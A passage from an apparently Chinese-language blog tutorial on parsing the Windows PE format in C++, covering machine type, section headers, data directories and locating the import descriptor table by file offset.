class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_NT_HEADERS64* ntTempHeader = \</span><br><span class="line">    (PIMAGE_NT_HEADERS64)(DWORD64)(&amp;fileContent[dosHeader-&gt;e_lfanew]);</span><br><span class="line"><span class="built_in">SetConsoleOutputCP</span>(CP_UTF8);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;程序位数    : &quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (ntTempHeader-&gt;FileHeader.Machine == <span class="number">0x8664</span>)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;64位\n&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ntTempHeader-&gt;FileHeader.Machine == <span class="number">0x014c</span>)</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;32位\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250103100814694.png" alt="image-20250103100814694" /></p><p>更多架构的类型说明在：<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#machine-types">https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#machine-types</a></p><h3 id="解析代码段-段头部"><a class="markdownIt-Anchor" href="#解析代码段-段头部"></a> 解析代码段-段头部</h3><p>这里由于已知是64位程序继续按照64位的讲下去</p><ol><li>使用<code>IMAGE_FILE_HEADER.NumberOfSections</code>获得区段数量</li><li>找到各个<code>section</code>的位置，计算公式：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo>=</mo><mi>N</mi><mi>T</mi><mi mathvariant="normal">_</mi><mi>H</mi><mi>E</mi><mi>A</mi><mi>D</mi><mi>E</mi><mi>R</mi><mo>+</mo><mi>n</mi><mi>t</mi><mi>H</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi>S</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>+</mo><mi>i</mi><mo>∗</mo><mi>s</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>H</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi>S</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">section[i]=NT\_HEADER+ntHeadSize+i*sectionHeadSize</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mord mathnormal">e</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mord mathnormal">e</span></span></span></span></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;区段数量: &quot;</span> &lt;&lt; ntTempHeader-&gt;FileHeader.NumberOfSections &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="type">int</span> nt_head_file_start = dosHeader-&gt;e_lfanew;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] address: 0x&quot;</span> &lt;&lt; </span><br><span class="line">        nt_head_file_start \</span><br><span class="line">        + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS64) \</span><br><span class="line">        + i * <span class="title function_">sizeof</span><span class="params">(IMAGE_SECTION_HEADER)</span> </span><br><span class="line">        &lt;&lt; &quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250103101928624.png" alt="image-20250103101928624" /></p><p>再对每个<code>IMAGE_SECTION_HEADER</code>进行解析就能得到相关信息</p><p>那么关于<code>IMAGE_SECTION_HEADER</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">            DWORD   PhysicalAddress;</span><br><span class="line">            DWORD   VirtualSize;</span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>这里来到第一个难点：<code>VirtualAddress</code>，简称 <strong>VA</strong>，这里用<code>.text</code>段也即第一个section来探索</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> nt_head_file_start = dosHeader-&gt;e_lfanew;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD64 sectionFileAddr = \</span><br><span class="line">        nt_head_file_start \</span><br><span class="line">        + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) \</span><br><span class="line">        + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">    </span><br><span class="line">    IMAGE_SECTION_HEADER* sectionHeader = \</span><br><span class="line">        (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot; Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] address: 0x&quot;</span> &lt;&lt; \</span><br><span class="line">        sectionFileAddr &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;   Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] name : &quot;</span> &lt;&lt; \</span><br><span class="line">        sectionHeader-&gt;Name &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;   Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] VA   : &quot;</span> &lt;&lt; \</span><br><span class="line">        sectionHeader-&gt;VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250103104342974.png" alt="image-20250103104342974" /></p><p>在CFF Explorer中，这些区段的低位和我们解析的地址是相同的，说明：<strong>VA是程序运行后，相对于rebase的偏移</strong>，在微软的文档中是这样说明的：</p><blockquote><p>加载到内存中的节的第一个字节的地址，相对于映像基。 对于对象文件，这是应用重定位之前第一个字节的地址。</p></blockquote><p>同样的<code>VirtualSize</code>选项可以得到改区段的大小，从而得到区段结束位置</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Misc.VirtualSize</span><br></pre></td></tr></table></figure><p>加载到内存中的节的总大小（以字节为单位）。 如果此值大于 <strong>SizeOfRawData</strong> 成员，则节将填充零。 此字段仅对可执行映像有效，对于对象文件，应设置为 0。</p></blockquote><p>利用在<code>IMAGE_SECTION_HEADER</code>中有一个<code>PointerToRawData</code>可以找到相关数据在文件中的位置，</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>A</mi><mi>d</mi><mi>d</mi><mi>r</mi><mo>=</mo><mi>s</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi mathvariant="normal">.</mi><mi>P</mi><mi>o</mi><mi>i</mi><mi>n</mi><mi>t</mi><mi>e</mi><mi>r</mi><mi>T</mi><mi>o</mi><mi>R</mi><mi>a</mi><mi>w</mi><mi>D</mi><mi>a</mi><mi>t</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">FileAddr=section.PointerToRawData</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">A</span><span class="mord mathnormal">d</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">o</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span></span></span></span>，就是直接从文件最开始相加就得到位置了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; <span class="string">&quot;区段数量: &quot;</span> &lt;&lt; ntTempHeader-&gt;FileHeader.NumberOfSections &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="type">int</span> nt_head_file_start = dosHeader-&gt;e_lfanew;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD64 sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">    IMAGE_SECTION_HEADER* sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot; Section[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] address: 0x&quot;</span> &lt;&lt; sectionFileAddr &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;            name        : &quot;</span> &lt;&lt; sectionHeader-&gt;Name &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;            VA          : 0x&quot;</span> &lt;&lt; sectionHeader-&gt;VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;            ptr2RawData : 0x&quot;</span> &lt;&lt; sectionHeader-&gt;PointerToRawData &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250103113642421.png" alt="image-20250103113642421" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151302092.png" alt="image-20250103113625530" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151309430.png" alt="image-20250103113815257" /></p><h2 id="如何找到导入的函数和dll-导入表"><a class="markdownIt-Anchor" href="#如何找到导入的函数和dll-导入表"></a> 如何找到导入的函数和DLL-导入表</h2><p>在编程中会使用到其他dll文件的函数，例如<code>kernel.dll</code>、<code>CRuntimeLib.dll</code>，PE文件通过一个导入目录（<strong>IAT</strong>）进行索引</p><p>在编写程序时，我们往往需要在程序中内置部分资源，甚至在上述的section遍历中我们也发现了许多的section，每一个不同的section都会存储不同类型的数据，比如</p><ul><li>代码段：包含可执行的程序代码。</li><li>数据段：包含初始化数据。</li><li>导入表：指定外部符号，告诉操作系统需要哪些外部函数。</li><li>导出表：列出了程序导出的函数，供其他程序调用。</li><li>资源表：包含程序使用的各种资源，如图标、对话框、字符串等。</li></ul><p>回到一开始 NT头的<code>OptionalHeader</code>部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER64</span> &#123;</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    DWORD       AddressOfEntryPoint;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure><ul><li><code>AddressOfEntryPoint</code>：指向入口点函数（相对于图像基址）的指针</li><li><code>DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]</code>：指向数据目录中第一 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/winnt/ns-winnt-image_data_directory">个IMAGE_DATA_DIRECTORY</a> 结构的指针</li></ul><p><code>DataDirectory</code> 存储了这些不同区域在文件中的位置和大小，因此它是一个“目录”或“索引”，指示每个数据段的位置。关于具体类型在该数组下的取值可以参考：<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-image_optional_header32">https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-image_optional_header32</a></p><p>具体的<code>IMAGE_DATA_DIRECTORY</code>结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>选择几个查看一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; <span class="string">&quot;---OptionalHeader.DataDirectories\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;基本重定位表           : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;全局指针的相对虚拟地址   : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_GLOBALPTR].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;导入地址表             : 0x&quot;</span> &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151315999.png" alt="image-20250103111009787" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151319181.png" alt="image-20250103120523637" /></p><p>**注意：**这里的<code>IMAGE_DIRECTORY_ENTRY_IAT</code>和<code>IMAGE_DIRECTORY_ENTRY_IMPORT</code>是两个东西</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/20250227151323839.png" alt="image-20250103125031177" /></p><p><strong>后续使用的是<code>IMAGE_DIRECTORY_ENTRY_IMPORT</code></strong></p><p>貌似依然是在内存中的虚拟地址，我们姑且将其称为<code>DVA</code>（datadirectory virtual adresss）。</p><p>那么如何通过<code>IMAGE_OPTIONAL_HEADER64</code>找到IAT呢？首先<code>IAT</code>的相关信息是一定存在文件中的，就不可避免地要计算偏移，将这个偏移设置为<code>RVA</code></p><p>结合<code>IMAGE_SECTION_HEADER</code>中有一个<code>PointerToRawData</code></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>V</mi><mi>A</mi><mo>=</mo><mi>D</mi><mi>V</mi><mi>A</mi><mo>−</mo><mi>V</mi><mi>A</mi><mo>+</mo><mi>P</mi><mi>t</mi><mi>r</mi><mi>T</mi><mi>o</mi><mi>R</mi><mi>a</mi><mi>w</mi><mi>D</mi><mi>a</mi><mi>t</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">RVA=DVA-VA+PtrToRawData</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span></span></span></span></p><p>这里以导入地址表为例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DWORD64 iatDVA = ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;</span><br><span class="line"></span><br><span class="line">DWORD64 iatVA = <span class="number">0</span>;</span><br><span class="line">DWORD64 iatRVA = <span class="number">0</span>;</span><br><span class="line">DWORD64 sectionFileAddr;</span><br><span class="line">IMAGE_SECTION_HEADER* sectionHeader;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    sectionFileAddr = nt_head_file_start + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS64) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER);</span><br><span class="line">    sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sectionHeader-&gt;VirtualAddress &gt; iatDVA)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    iatVA = sectionHeader-&gt;VirtualAddress;</span><br><span class="line">    iatRVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如何使用RVA？</strong></p><p>RVA就是从文件开始IAT的基地址，所有<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体都是从此开始找的。但是并没有相关变量说明了总数，那么只能依靠<code>IMAGE_IMPORT_DESCRIPTOR</code>的变量名来查找了，自然想到的就是Name为0就退出</p><p>对于<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp; </span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>那么想办法打印<code>IMAGE_IMPORT_DESCRIPTOR</code>的结构体名称，可以由公式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi>O</mi><mi>f</mi><mi>f</mi><mi>s</mi><mi>e</mi><mi>t</mi><mo>=</mo><mi>N</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>−</mo><mi>V</mi><mi>A</mi><mo>+</mo><mi>P</mi><mi>t</mi><mi>r</mi><mi>T</mi><mi>o</mi><mi>R</mi><mi>a</mi><mi>w</mi><mi>D</mi><mi>a</mi><mi>t</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">NameOffset = Name -VA+PtrToRawData</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord 